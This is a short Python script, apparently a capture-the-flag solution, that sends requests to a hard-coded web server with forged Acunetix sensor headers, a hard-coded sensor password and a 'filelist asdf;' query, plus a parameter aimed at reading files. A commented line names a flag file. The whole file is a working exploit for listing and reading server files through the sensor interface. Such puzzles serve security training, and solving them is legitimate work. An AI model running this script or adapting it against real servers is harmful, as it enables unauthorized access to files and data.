import requests

headers = {'ACUNETIX-ASPECT': 'enabled',
        'ACUNETIX-ASPECT-PASSWORD': '4faa9d4408780ae071ca2708e3f09449',
        'ACUNETIX-ASPECT-QUERIES': 'filelist asdf;'}
#params = {"super_secret_parameter_hahaha": "super_secret_file_containing_the_flag_you_should_read_it.php",
#        "asdf": "zxv"}
params = {"super_secret_parameter_hahaha": "style.css", "asdf":"Zxcv"}
#r = requests.get('http://54.200.58.235/index.php', headers=headers, params=params)
r = requests.get('http://54.200.58.235/index.php', headers=headers, params=params)
#r = requests.get('http://insu.gtisc.gatech.edu/share/index.php', headers=headers, params=params)

print(r)
print(r.text)
